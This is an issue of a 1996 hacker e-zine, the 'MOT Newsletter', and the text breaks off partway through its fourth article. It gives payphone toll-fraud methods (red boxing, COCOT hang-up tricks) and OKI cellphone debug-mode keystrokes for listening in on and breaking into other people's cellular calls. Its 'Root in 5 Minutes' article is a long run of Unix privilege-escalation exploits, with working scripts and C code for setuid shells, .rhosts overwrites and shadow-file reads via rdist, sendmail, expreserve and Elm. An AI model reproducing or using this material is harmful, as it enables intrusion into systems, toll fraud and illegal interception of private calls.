@@ -1,0 +1,1765 @@
+                           Masters of Technology
+                                  Present
+
+                            The MOT Newsletter!
+                         Issue 2, February 1, 1996
+
+------------------------------------------------------------------------------
+
+                           Editor:  The Godfather
+
+------------------------------------------------------------------------------
+
+DISCLAIMER!!!
+
+This file is written for informational purposes only. I, The Godfather, 
+or the writers, do not take any responsibility for any actions taken by 
+readers of this magazine, unless specifically said in the respective 
+article.
+
+-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
+
+Contents:
+
+Introduction
+                   
+800 BBS Risks,      Telsa,           Phile 1 of 7
+
+Making Free Calls
+From a Payphone,    joey@dvh.net,    Phile 2 of 7
+
+OKI Debug Info,     The Godfather,   Phile 3 of 7
+
+Root in 5 minutes,  The Godfather,   Phile 4 of 7
+
+Full (No) Armor,    The Godfather,   Phile 5 of 7
+
+950-xxxx Scan,      The Godfather,   Phile 6 of 7
+
+800 Services
+Part One of Two,    The Godfather,   Phile 7 of 7
+
+BBS Update                   
+                                                  
+Distribution Info 
+
+Editorial
+
+Letters
+
+MOT News
+
+-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
+                                
+                                Introduction 
+                              By: The Godfather
+
+    Welcome to the Masters of Technology newsletter.  We aren't another lame
+group, just a publisher of information such as Phrack.  Anyone can write for
+MOT, just send me the article at "Gfather@cris.com", or at the L0pht BBS.
+    Some of these philes were not sent to me, but I grabbed them and since
+they hadn't been published anywhere else, decided to throw them in.
+          
+Greetz to:  Cyber Link, Mind Rape (I'll call, I'll call, give me time),
+            Redboxchillipepper (You cool guy you), Mercenary, Mr. X (
+            where the hell are you?), Crawl, Dark Tangent
+
+Affilz:     You think this is a warez newsletter?  Jeez...  BTW, I want to
+            be in the PLA so I can be a cool d00d, and distrubute k-radical
+            PLA business cards all over town, and slaughter innocent gerbils.
+
+Other mags
+to read:    Because I didn't start this magazine to DRAW readers from any
+            other magazines, I'll put in other mags I think are well worth
+            your time.  For humor and phreaking, read the Phone Losers of
+            America.  Their current issue is #38 I believe.  For ALL sorts
+            of subjects, read Phrack.  Currently the issue is #47.  These
+            are the more currently updated mags that are electronic and
+            are free.
+
+Articles
+for MOT 
+issue 3:    If I have time, I'll put together one on the Stromberg-Carlson
+            DCO 17 switch.  That is the switch we have in my area.  I am
+            going to have to call this MOTT (Masters of _Telephone_ 
+            Technology) if I don't get more (or any) hacking articles. 
+            Send those along.  Send me boards to put up in our BBS Update,
+            I had to keep along the same ones.  Look for a good article
+            in MOT #3, but I'm not telling you the subject :)
+
+Grr.  Send me articles.  Jeez, how come Phrack gets all the fucking articles.
+Doesn't anyone write stuff anymore?  I get tired of seeing my name on every
+article in the mag.  I guess Phrack isn't doing real well either.  Oh well.
+I'll continue putting out this magazine articles or not, but if you get
+tired of my articles, fucking send me some.
+
+-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
+
+                               800 BBS Risks
+                                 By: Telsa
+                               Phile 1 of 7
+
+
+A word to the wise :
+
+Originally I wrote a textfile called 800-BBS.TXT. wihch explained how to 
+setup and 800 number to your BBS.  A warning, THIS IS NOT SAFE anylonger.
+AT&T has caught on, and in addition to veryifing that you actually ordered
+the service, now they call you in a week to verify again, if they get a
+Modem or Fax machine they find out who owns the local number [the BBS] and
+calls them up, and even if you deny it, they can still make you pay the 
+fee.  It is very expensive and AT&T aint fucking around any longer.  They
+are busting boards now left and right, so if you wanna take the risq and do
+it, be my guest,just keep in mind, there is now a 80% chance of getting busted
+Also AT&T logs every call coming into a BBS [8oo number] and even tho they
+have never done it to me, they might call to ask if you know the person at
+the 800.  There is alot of ppl who have read my textfile and have been 
+enlightened into how to do it, but you really didnt expect that AT&T was
+going to let this go on forever, did you?
+
+        I really dont care if you read this and care or not, im just warning
+you becuz a few friends of mine who have used this method have had to pay       
+outstanding bills of 10,000 dollars, no joke..  So i warned you, do whatever
+
+
+Tesla
+
+-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
+
+                      Making Free Calls from a Payphone
+                             By: joey@dvh.net
+                               Phile 2 of 7
+
+From news.uiowa.edu!red.weeg.uiowa.edu!jhentzel Mon Sep 18 00:22:35 1995
+Path: news.uiowa.edu!red.weeg.uiowa.edu!jhentzel
+From: jhentzel@red.weeg.uiowa.edu (J. Hentzel)
+Newsgroups: alt.2600
+Subject: Re: Pay Fones
+Date: 18 Sep 1995 05:14:02 GMT
+Organization: University of Iowa, Iowa City, IA, USA
+Lines: 82
+Distribution: world
+Message-ID: <43iv6q$6fb@nexus.uiowa.edu>
+References: <43f1dj$djr@over.mhv.net>
+NNTP-Posting-Host: red.weeg.uiowa.edu
+X-Newsreader: TIN [version 1.2 PL2]
+
+Joey (joey@mhv.net) wrote:
+: Hi,
+
+: Could someone tell me how to get a free phone call on a pay fone??
+
+       If the telephone is owned by the telephone company, then centralized 
+equipment is used to determine how much money has been insertered into 
+the telephone. This is done via a series of beeps sent by the pay telephone 
+down the phone line depending on the amount of money inserted. The phone 
+transmits one beep for a nickel, two for a dime, five for a quarter and so 
+on. The centralized equipment detects these tones and remembers how much 
+money has been inserted, and allows your call to proceed after the proper 
+amount. Due to the nature of data sent on the telephone line, the pay 
+telephone is not the only device able to make the proper tones. You can 
+simulate the "sound" of coins being put into the payphone with a device 
+called a 'red box'. 
+       The net abounds with plans for red boxes, and you should look into 
+some of the nicer ones, as they produce clear tones which match the 
+payphones almost exactly. However, a perhaps easier option is to use a 
+microcassette recorder and an answering machine together as follows: Go to a 
+payphone, call your answering machine, then put several quarters into the 
+phone while the machine is recording your message. This will record the 
+sounds that quarters make when they are inserted into a pay telephone onto 
+your answering machine. Then use a microcassette recorder to play the tape 
+from the answering machine into the microphone of a payphone receiver 
+after dialing a long distance number.
+       In recent years, the phone companies have attempted to curtail red 
+boxing by making the microphone inactive on its new pay phones while it waits
+for money to be inserted. This makes it impossible to simply play the tones 
+into the microphone and have them automatically sent out on the phone 
+line, and it becomes a more difficult to trick the equipment. This can 
+be circumvented by attaching a regular telephone to the coin line and using
+it to make the call. Because the telephone companies control all billing
+centrally, a normal phone will behave exactly like a payphone when
+hooked to a coin line.
+       If the pay phone is privately owned, it is called a COCOT (Customer 
+Owned Coin Operated Telephone), or less commonly COPT (Customer Owned Pay
+Telephone) These payphones are not affiliated with the telephone company,
+so they cannot use the centralized money detection system and must do the
+work internally. Some COCOTs are very easy to defraud. The common method is 
+as follows:  
+       The FCC requires that 800 numbers be dialable for free from any 
+payphone (this includes COCOTs) on the belief that this will allow all long 
+distance companies to be accessible from any phone. You can use this 
+regulation against some COCOTs by dialing an 800 number and waiting until the 
+person/machine hangs up. Most switches will return the dialtone at this 
+time and you are free to make any calls anywhere (for free) because the 
+phone still thinks you are on the 800 number. Actually, you can dial any 
+number, with numbers that do not require a coin deposit being the obvious 
+preference (0, etc) and wait until you are hung up on. The 'standard' number 
+is 800 LOAN YES, which sometimes does not work, but there are many numbers 
+with brief messages that disconnect you, we'll always have operators!
+       You will find that almost all COCOTs respond differently to 800 
+numbers that hang up on you. The vulnerable ones I have found allow me to 
+hear about one second of dialtone before muting it out. If you begin 
+dialing your number while the dialtone is audible it will work perfectly 
+and connect you for free. You may need a Radio Shack tone dialer to make 
+the DTMF tones to dial the phone if its keypad is turned off or does not 
+make the real tones. These are relatively common practises and are easily 
+bypassed with a simple tone dialer. You will probably find that most 
+COCOTs will let you hear only dead air after the number hangs up on you, 
+and after 30 seconds the recording "If you'd like to make a call..." 
+comes on.  
+       People posting the 800 method are often ridiculed because this 
+hack is so old that it supposedly never works anymore. I personally have 
+found three COCOTs vulnerable to this problem, it mostly depends on where you
+find your COCOTs. Super Markets are a good place. Many of them have two 
+or more COCOTs there and most are vulnerable to the hang up trick.
+       Because the COCOT is not owned by the telephone company, it has a 
+normal telephone line and does all billing internally. Payphones owned by 
+the telephone company are just normal phones that make special tones 
+when money is put into them. A regular (non-pay) telephone connected to a coin
+line will still ask for "Three Dollars and Ten Cents" to be inserted for a 
+long distance call. Obviously, this is not true for the COCOT. If you bypass 
+the phone, by connecting your own phone to its telephone line you can dial 
+long distance just as you would on any phone.
+       Many COCOTs are very intelligent these days, and the they are 
+rarely the easy target they once were. Your best bet is probably to red 
+box off a telco phone. Its easier, and its less likely ever to be detected.
+
+
+Joe
+
+-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
+
+                            OKI Debug Mode Info
+                             By: The Godfather
+                               Phile 3 of 7
+
+
+Note:  Some of this information came from The L0pht, but I expanded on it
+       quite a bit. 
+
+
+To enter debug mode:
+
+Power the phone up.  Wait for PowerOn msg.  Hit 7 and 9 together.
+Then hit Menu, Snd, End, Rcl, Sto, Clr.  Phone says "good timing!!!"
+Debugger is now enabled, but phone works normally.  Hit 1 and 3
+together to halt phone and enter debugger.  Everything on display
+lights up.  Hit Clr until you get status display.
+
+Now you can execute commands listed below.  For example to reboot phone
+enter #, 0, 2, Snd.  Commands all start with # and end with Snd.  Some
+take arguments.
+                                                                             
+You can use #25, to display memory in EEPROM, hit # and * to go up and down 
+in memory, Clr to exit.  Hex chars are entered as "*n", like *1=A, *2=B, etc.
+
+SUSPEND     #01         Performs Initialization
+RESTART     #02         Terminates the test mode
+STATUS      #03         Shows current status of TRU
+RESET       #04         Resets the autonomous timer
+TURNAROUND  #05    ?    Returns Data Bytes following command to the Test Set.
+INIT        #06         Initialize the TRU to following states:
+                         Carrier Off, Attenuation - 0db, Receive Audio Muted
+                         Transmit Audio Muted, Signalling tone off,
+                         Autonomous timer reset, SAT off, and DTMF off
+CARRIER ON  #07         Turns the carrier on
+CARRIER OFF #08         Turns the carrier off
+LOAD SYNTH  #09XXXX     Sets the synthesizer to channel XXXX
+SET ATTN    #10X        Set the RF power attenuation to X
+                         0=0db, 7=-28 db (in steps of -4db thru 7)
+RXMUTE      #11         Mutes the receive audio
+RXUNMUTE    #12         Unmutes the receive audio
+TXMUTE      #13         Mutes the transmit audio
+TXUNMUTE    #14         Unmutes the transmit audio
+RESETOFF    #15         Discontinues resetting of autonomous timer
+STON        #16         Transmits a continuous signalling tone
+STOFF       #17         Stops transmission of signalling tone
+SETUP       #18         Transmits a 5 word RCC message (fixed text pattern)
+VOICE       #19         Transmits a 2 word (RCC) RVC message (fixed test pattern)
+RCVSU       #20         Receives a 2 word FCC message (cancel with 0x38)
+RCVVC       #21         Receives a 1 word (FCC) FVC message (cancel with 0x38)
+SEND-NAM    #22         Returns the information contained in the NAM
+VERSION     #23
+SEND-SN     #24
+MEM         #25XXXX     Displays the resident memory data at XX
+                          00XX=in micro, XXXX=EEPROM
+WSTS        #28         Count 1 word messages on CC, until TERMINATE
+WSTV        #29         Count 1 word messages on VC, until TERMINATE
+SATON       #32X        Enable the transmission of SAT X
+                         0= 5970 Hz, 1=6000 Hz, 2=6030 Hz
+SATOFF      #33         Disables the transmission of SAT
+CDATA       #34<60>     Transmits 5 word RCC message (30 bytes)
+HITNON      #35         Activates the 1150Hz tone to receive audio line
+HITNOFF     #36         Deactivates the 1150Hz tone
+LOTNON      #37         Activates the 770Hz tone to receive audio line
+LOTNOFF     #38         Deactivates the 770Hz tone
+DTMFON      #42XX       Enable the transmission of DTMF frequency XX[2]
+DTMFOFF     #43         Disable the transmission of DTMF
+?           #44
+?           #45
+?           #46
+?           #47
+?           #48
+?           #51
+-           #52<xx>
+
+
+
+
+?           #53
+-           #54XXXXZZ   Write HEX (ZZ) into ADDRESS $XXXX
+                        if 00XXZZ then store #$YY in MicoRAM $XX
+-           #56         Return Value stored in $BEBB
+?           #60
+?           #62
+?           #63
+RCVSU       #64         Receives a 2 word FCC message (duplicate of cmd #20                    CMD Compress Tx Mute Rx Mute
+                            --- -------- ------- -------
+                            40  on       unmuted unmuted
+                            41  off      unmuted unmuted
+                            42  on       muted   unmuted
+                            43  off      muted   ummuted
+                            44  on       unmuted muted
+                            45  off      unmuted muted
+                            46  on       muted   muted
+                            47  off      muted   muted
+?           #72          [pulls something, outputs 1 word!?!]
+?           #73<arg>
+
+                      Scans channels,...
+
+                       #73 XXXX xxxx YY
+
+                        XXXX = Start channels scan
+                        xxxx = End   channels
+                         yy  = Time
+
+?           #74
+-           #75         Enable Handsfree (disable spkr)
+-           #76         Disable Handsfree (enable spkr)
+-           #77         Turns on Loudspeaker near mic
+-           #79
+?           #80
+?           #81
+?           #84
+?           #85
+
+Okay, now to the stuff you can actually DO with this information.  I actually
+figured out how to listen without help, but Dark Tangent and B-String (or
+was it G-String) on the Defcon Voice Bridge told me how to actually break
+in the cellular conversation.
+
+Listening to people:
+
+#12
+#14           - This sets up the phone, unmutes audio, turns on speaker
+#76
+
+#73xxxxxxxx02 - Scans the cellular channels.  
+
+When you scan for channels, the 02 tacked on the end says to pause 2 seconds
+between channels.  Pressing "#" pauses at the current channel, "#" continues
+after you have paused, "*" goes to the beginning of the scan.  
+
+Breaking into the conversation:
+
+#12           
+#14
+#670          - Sets up the phone.  Unmutes, turns on mic, turns on carrier
+#77
+#100
+
+#07           - To speak into phone.  Depending on where you are in relation
+                to the speakers, this might not work.
+
+#08           - Stop talking to them
+
+Don't abuse this, I don't want any recalls, or new phones without this neat
+little debug mode.  This has been tested with the OKI 900 and 1325
+phones.
+
+Other things:
+
+In my area, there are channels (0350, 0353) that make a warbling sound.
+They do it always.  I have no explanation for that, but make note of things
+like that, they could be open for exploration.
+
+Don't think you will get multitudes of computer passwords or "secret"
+information listening to people, usually it is EXTREMELY boring.  You can
+always laugh at some bitch when she breaks up with her boyfriend, or at
+some man talking to his wife about eating her pussy, but I have scanned a
+LONG time, and the most I got was a phone number to another cellular phone.
+Whoopie, big deal.
+
+
+-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
+
+                          Getting Root in 5 Minutes
+                             By:  The Godfather
+                                Phile 4 of 7
+
+   Finally a hacking phile.  Sort of.  Although this is pretty elementary
+information, I haven't seen it elsewhere, so maybe some people will learn
+something.  Anyway the title is pretty much self explanatory, and if you
+have more bugs, send them here.
+
+Type of System:  Unix
+Versions:  All?
+Description:  Files owned by root with write/execute permissions to all
+              can be changed into a root shell by coping /bin/sh over
+              the file.
+Example:
+
+% ls -l
+% -rwxrwx-wx  1  root  31337  Jan 5  19:12  foobar
+% cp /bin/sh foobar
+% foobar
+#
+
+Type of System:  AIX
+Versions:  all?
+Description:  tprof with the -x parameter executes programs with suid 0
+Example:
+
+% tprof -x /bin/sh
+#
+
+Type of System:  AIX
+Versions:  2.2.1
+Description:  /etc/shadow is writeable
+Example:
+
+% echo "rewt::0:0:blahness:/:/bin/sh" >> /etc/shadow
+% telnet localhost
+Trying...
+Connected to haqd.com.
+Escape character is '^]'.
+
+login: rewt
+
+#
+
+Type of System: AIX
+Versions:  3.x.x
+Description:  rlogind has hole
+Example:
+
+% rlogin localhost -l -froot
+#
+
+Type of System:  BSD, Ultrix
+Versions:  4.2 and 3.0 respectively
+Description:  symbolic links broken, view any file
+Example:
+
+% ln -s /etc/shadow /home/haquer/.plan
+% finger haquer
+
+Login: haquer                 Name: hacker
+Directory: /home/haquer       Shell: /bin/csh
+Last Login Fri Apr 13 16:10 (CST) on tty01
+No Mail.
+<contents of /etc/shadow>
+
+Type of System:  Dynix, Ultrix
+Versions:  3.0.14 and 2.x respectively
+Description:  sendmail bug, reads any file
+Example:
+
+$ sendmail -C /etc/shadow
+<contents of /etc/shadow>
+
+Type of System:  Dynix, Irix
+Versions:  all?
+Description:  rsh bug executes commands as root
+Example:
+
+$ rsh localhost -l "" /bin/sh
+
+#
+
+Type of System:  HP/UX
+Versions:  7.0-
+Description:  chfn accepts newlines
+Example:
+
+% chfn -f haquer^Mrewt::0:0::/:/bin/sh
+% rlogin localhost -l rewt
+Warning: .lastlogin not found.
+#
+
+Type of System:  UNIX
+Versions:  SunOS, others
+Description:  sendmail problem
+Example:
+
+% telnet host.com 25
+220 host.com SunOS Sendmail 8.6.1 #5 ready at Fri, 12 May 95 02:10 (CST)
+VRFY decode
+250 <|/usr/bin/uudecode>
+MAIL FROM: bin
+250 <bin> ... Sender Okay
+RCPT TO: decode
+250 <decode> ... Recipient Okay
+DATA
+354 Enter mail, end with "." on a line by itself
+begin 644 /bin/.rhosts
+$*R K"O\
+
+end
+.
+250 Mail accepted
+quit
+221 host.com closing connection
+Connection closed by foreign host.
+% rlogin host.com -l bin
+$
+
+Type of System:  Unix
+Versions:  all  (Most system have patched this)
+Description:  tftp can be used to get any file
+Example:
+
+% tftp host.com
+tftp> get /etc/passwd
+tftp> quit
+% ls passwd
+passwd
+%
+
+Type of System:  SunOS, A/UX, SCO, others
+Versions:  4.1.2-, 2.0.1, 3.2v4.2, ? respectively
+Description:  rdist(1) can be manipulated to give root
+Example:
+
+% cat > distfile
+HOSTS = host
+FILES = w00p
+${FILES} -> ${HOSTS}
+     install /tmp/1;
+     notify user;
+^D
+% cat > usr.c
+main()
+{
+       setuid(0);
+       chown("goodie", 0, 0);
+        chmod("goodie", 04755);
+        exit(0);
+}
+^D
+% cp /bin/sh ./goodie
+% cc -o usr usr.c
+% set path=( . $PATH)
+% setenv IFS /
+% rdist
+updating host localhost
+rdist: w00p: no such file or directory
+notify @host ( user )
+% goodie
+#
+
+Type of System: UNIX
+Versions:  with rdist
+Description:  rdist buffer overflows, makes suid shell
+Example:
+
+----------------------------------CUT HERE----------------------------------
+
+#!/bin/sh
+SUID=/tmp/xtrek
+cat <<_EOF_ > test 
+Taaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Qaaaaaaaaaaaaaaaaaaaaaaaaaa
+Qaaaaaaaaaaaaaaaaaaaaaaaaa
+Qaaaaaaaaaaaaaaaaaaaaaaaa
+Qaaaaaaaaaaaaaaaaaaaaaaa
+Scp /bin/sh $SUID
+Schmod 4755 $SUID 
+_EOF_
+cat test | /usr/ucb/rdist -Server localhost 
+rm -rf test 
+if [ -f $SUID ]; then 
+echo "$SUID is a  setuid shell. " 
+ fi 
+# 
+
+----------------------------------CUT HERE-----------------------------------
+
+% rdist.sh
+/tmp/xtrek is a  setuid shell.
+% /tmp/xtrek
+#
+
+Type of System:  UNIX
+Version:  Many
+Description:  getpwent() hole, sometimes can get /etc/shadow file
+Example:
+
+% cat > unshadow.c
+#include <pwd.h>
+main(){struct passwd *p;while(p=getpwent())
+printf("%s:%s:%d:%d:%s:%s:%s\n\r", p->pw_name, p->pw_passwd,
+p->pw_uid, p->pw_gid, p->pw_gecos, p->pw_dir, p->pw_shell);}
+^D
+% cc -o unshadow
+% unshadow > gotcha
+% cat gotcha
+<contents of shadow file>
+
+Type of System:  UNIX
+Versions:  mail program Elm, all versions
+Description:  any user with access to autoreply can become root
+Example:
+
+--------------------------------CUT HERE------------------------------------
+#!/bin/sh
+#
+# fixrhosts rhosts-file user machine
+#
+if [ $# -ne 3 ]; then
+       echo "Usage: `basename $0` rhosts-file user machine"
+       exit 1
+fi
+RHOSTS="$1"
+USERNAME="$2"
+MACHINE="$3"
+cd $HOME
+echo x > "a
+$MACHINE $USERNAME
+b"
+umask 022
+autoreply "a
+$MACHINE $USERNAME
+b"
+cat > /tmp/.rhosts.sh.$$ << 'EOF'
+ln -s $1 `echo $$ | awk '{printf "/tmp/arep.%06d", $1}'`
+exec autoreply off
+exit 0
+EOF
+/bin/sh /tmp/.rhosts.sh.$$ $RHOSTS
+rm -f /tmp/.rhosts.sh.$$ "a
+$MACHINE $USERNAME
+b"
+exit 0
+
+--------------------------------CUT HERE------------------------------------
+
+% ./fixrhosts ~root/.rhosts haquer host
+You've been added to the autoreply system.
+You've been removed from the autoreply table.
+% rsh host -l root csh -i
+#
+
+Type of System:  UNIX
+Versions:  all?
+Description:  sendmail debug mode hole.  Use of debug and ~/.forward lets
+              a user local to the system read any file
+Example:
+
+% ln -s /etc/shadow .forward
+% ls -la .forward
+lrwxrwxrwx   1 haquer    haquers         11 Sep  5 12:08 .forward -> /etc/shadow
+% telnet localhost smtp
+Trying 127.0.0.1...
+Connected to host.
+Escape character is '^]'.
+220 host.lame.com Smail3.1.28.1 ready for fakemail on Mon, 5 Sep 94 12:10 EST
+debug 20
+250 Debugging level: 20
+expn haquer
+[lots of crap]
+expand_string(~/.forward, /home/haquer, haquer) called
+expand_string returns /home/haquer/.forward
+dtd_forwardfile:  opening forward file /home/haquer/.forward
+[more crap]
+read 890 bytes
+director dotforward: matched haquer, forwarded to
+root:31337d00d:0:0:99999:7:::
+bin:*:8000:0:99999:7:::
+daemon:*:8000:0:99999:7:::
+nobody:*:8000:0:99999:7:::
+haquer:GTEsuCks11!:8000:0:99999:7:::
+[....]
+process_field: entry
+We have a group
+We have a group
+process_field: error: recursive address group
+550 haquer ... not matched
+quit
+221 host.lame.com closing connection
+Connection closed by foreign host.
+
+Type of System:  UNIX
+Version:  all?
+Description:  sendmail called with -D flag will allow you to create/append
+              to any file on the system
+
+% cat ~/.forward
+
+localhost loser
+^D
+% smail -bs -D ~root/.rhosts -v20
+220 host.lame.com Smail3.1.28.1 ready for fakemail on Mon, 5 Sep 94 12:23 EST
+expn haquer
+250 haquer
+quit
+221 host.lame.com closing connection
+% rsh -l root localhost tcsh\ -i
+Warning: no access to tty (Bad file number).
+Thus no job control in this shell.
+# 
+
+Type of System:  UNIX
+Version:  all?
+Description:  sendmail .forward problem, files in ~/.forward can be created
+              in any directory, regardless of permissions, albeit the owner
+              of the file is the mailbox owner
+Example:
+
+% echo "/etc/nologin" > ~/.forward
+% mail -r root loser < /dev/null
+% echo "Site shutdown due to smail lameness" >!  /etc/nologin
+% rlogin localhost
+Site shutdown due to smail lameness
+rlogin: connection closed.
+
+Type of System:  UNIX
+Versions:  all?
+Description:  expreserve
+Example:
+
+----------------------------------CUT HERE-----------------------------------
+/*
+ *  Exploit a security hole in expreserve on sun4.1.3
+ *    <program> filename
+ *       overwrites filename as root with garbage, chown's to you
+ *       (note, a 4.1.1 test overwrote with no chown
+ *        the first 4 characters written are "+ +\n"
+ *        which can be used to overwrite anyones .rhosts as root)
+ */
+
+#include <pwd.h>
+#include <fcntl.h>
+
+#define HBLKS 2
+#define FNSIZE 128
+#define BLKS   900
+
+typedef struct {
+  time_t time;
+  int uid;
+  int flines;
+  char name[FNSIZE];
+  short Blocks[BLKS];
+  short encrypted;
+} header;
+
+
+main(argc,argv)
+int argc;
+char **argv;
+{
+  int p,u;
+  header H;
+  struct passwd *pw;
+  char buf[100],*dest;
+
+  if(argc!=2) {
+    printf("usage: %s destination\n",argv[0]);
+    exit(1);
+  }
+  dest = argv[1];
+  p = getpid();
+  pw = getpwuid(getuid());
+  sprintf(buf,"/var/preserve/%s/Exaaa%.5d",pw->pw_name,p);
+  symlink(dest,buf);
+  close(0);
+  if(open("./Ex",O_RDWR|O_CREAT,0666)<0)  {
+    printf("Cant open Ex (temp file)\n");
+    exit(2);
+  }
+/* fill out header so that expre thinks its legit */
+  H.time = 12345;    /* who cares */
+  strcpy(&H.time,"+ +\n");    /* its a long, we got some free bytes in there*/
+  strcpy(H.name,"NoName");
+  H.flines = 0;
+  H.uid = getuid();
+  H.Blocks[0] = HBLKS;
+  H.Blocks[1] = HBLKS+1;
+  write(0,&H,sizeof(H));
+  lseek(0,0,0);
+  printf("Made temp file 'Ex'.  You can remove it when done.\n");
+  execl("/usr/lib/expreserve","expreserve",0);
+  printf("Couldnt exec!\n"); 
+}
+  
+--------------------------------CUT HERE------------------------------------
+
+% cc -o xp xp.c
+% id
+uid=666(haquer) gid=50(luser) groups=50(luser)
+% xp /home/doofus/.rhosts
+% rlogin host -l doofus
+% id
+uid=303(doofus) gid=50(luser) groups=50(luser)
+%
+
+Type of System:  SunOS
+Version: 5.2 (sendmail 8.6.x)
+Description: sendmail can get root shell
+Example:
+
+---------------------------------CUT HERE-----------------------------------
+
+#!/bin/sh
+# exploit new sendmail bug to give us a root shell
+# 24 mar 94  jwa/scd @nau.edu
+# "short version"
+# tested on sunos 5.2/sendmail 8.6.4
+
+# location of sendmail
+SENDMAIL=/usr/lib/sendmail
+
+# location of original sendmail.cf file
+CONFIG=/nau/local/lib/mail/sendmail.cf
+#CONFIG=`strings $SENDMAIL | grep sendmail.cf`
+
+# program to execute as root
+SHELL=/bin/csh
+
+TEMPDIR=/tmp/sendbug-tmp.$$
+mkdir $TEMPDIR
+chmod 700 $TEMPDIR
+cd $TEMPDIR
+
+cp $SENDMAIL sm
+chmod 700 sm
+
+echo "Creating setid0 ..."
+cat > setid.c << _EOF_
+
+/* set uid to zero, thus escaping the annoying csh and solaris sh
+ * problem..
+ * 
+ * if (getuid() != geteuid()) {
+ *  printf("permission denied, you root-hacker you.\n");
+ *  exit(1);
+ * }
+ *
+ * .. must be run euid 0, obviously.  with no args it runs /bin/sh, 
+ * otherwise it runs the 1st arg.
+ */
+
+#include <stdio.h>
+
+main(argc, argv)
+int argc;
+char *argv[];
+{
+ int uid;
+
+ setuid(0);
+ setgid(0);
+ seteuid(0);  /* probabally redundant. */
+ setegid(0);
+
+ uid = getuid();
+
+ if (uid != 0) {
+  printf("setuid(0); failed!  aborting..\n");
+  exit(1);
+ }
+
+ if (argc !=2) {
+  printf("executing /bin/sh...\n");
+  system("/bin/sh");
+ }
+  else
+ {
+  printf("executing %s...\n", argv[1]);
+  system(argv[1]);
+ }
+}
+_EOF_
+
+cc -o setid0 setid.c
+
+echo "Creating calc..."
+
+cat > calc.c << _EOF_
+/*
+ * Determines offset in sendmail of 
+ * sendmail.cf file location.
+ * author: timothy newsham
+ */
+#include <fcntl.h>
+
+gencore()
+{
+  int pid;
+  int fd[2];
+
+  if(pipe(fd) < 0) {
+    perror("pipe");
+    exit(1);
+    return(0);
+  }
+  pid = fork();
+  if(!pid) {
+    int f = open("./out", O_RDWR|O_CREAT, 0666);
+    dup2(f, 1); dup2(fd[0], 0);
+    close(f); close(fd[1]); close(fd[0]);
+    execl("./sm","sm","-d0-9.90","-oQ.","-bs", 0);
+    perror("exec");
+    exit(0); 
+  } else {
+    sleep(2);
+    kill(pid, 11);
+  }
+  close(fd[0]);
+  close(fd[1]);  
+}
+
+main(argc,argv)
+char **argv;
+int argc;
+{
+  unsigned int ConfFile,tTdvect,off;
+  
+  gencore();
+  sync();   /* grr. */
+  tTdvect = find("ZZZZZZZZ", "core");
+  ConfFile = find(argv[1], "core");
+  if(!tTdvect || !ConfFile) { 
+   return(1);
+  } 
+  off = ConfFile - tTdvect;
+
+  printf("-d%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.0\n",
+  off, '/', off+1, 't', off+2, 'm', off+3, 'p', off+4, '/', off+5, 's', \
+  off+6, 'm', off+7, '.', off+8, 'c', off+9, 'f', off+10); 
+}
+
+int find(pattern, file)
+char *pattern,*file;
+{
+  int fd;
+  int i, addr;
+  char c;
+
+  fd = open(file, 0);
+
+  i = 0;
+  addr = 0;
+  while(read(fd, &c, 1) == 1) {
+    if(pattern[i] == c)
+      i++;
+    else
+      i=0;
+    if(pattern[i] == '\0') {
+      addr -= strlen(pattern);
+      return(addr);
+    }
+    addr++;
+  }
+  return(0);
+}
+_EOF_
+cc calc.c -o calc
+
+echo "Scanning core image for $CONFIG..."
+
+DEBUGFLAGS=`calc $CONFIG`
+
+echo "Creating alias.sh ..."
+echo "#!/bin/sh
+# this program will be executed when mail is sent to the fake alias.
+# since solaris sh and csh and tcsh refuse to run when euid != realuid,
+# we instead run the program we compiled above.
+
+/bin/chmod 6777 $TEMPDIR/setid0
+/bin/chown root $TEMPDIR/setid0
+/bin/sync
+
+" > alias.sh
+
+chmod 755 alias.sh
+
+echo "Creating fake alias file..."
+echo "yash: |$TEMPDIR/alias.sh" > aliases
+
+echo "Faking alias pointer in new config file..."
+egrep -v '(OA|DZ|Ou|Og)' $CONFIG > /tmp/sm.cf
+echo "
+# hacks follow
+
+OA/$TEMPDIR/aliases                       # our fake alias file
+Ou0                                # user ID to run as
+Og0                                # group ID to run as
+DZWHOOP-v1.0" >> /tmp/sm.cf
+
+echo "Creating the sendmail script..."
+
+cat > sendmail.script << _EOF_
+helo
+mail from: <nobody>
+rcpt to: <yash>
+data
+yet another sendmail hole?  suid whoop?
+\.                                 # oops.. delete \ prior to execution
+quit
+_EOF_
+
+echo "Executing $SENDMAIL $DEBUGFLAGS -bs..."
+
